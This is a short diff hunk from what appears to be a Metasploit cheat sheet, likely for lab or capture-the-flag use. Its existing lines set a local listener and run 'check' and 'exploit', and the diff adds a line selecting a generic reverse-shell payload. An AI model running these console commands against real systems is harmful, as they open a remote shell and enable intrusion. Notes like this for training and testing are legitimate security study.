@@ -9,3 +9,5 @@ set LHOST tun0
 check
 # Execute exploit
 exploit (or) run
+# Change payloads
+set payload generic/shell_reverse_tcp
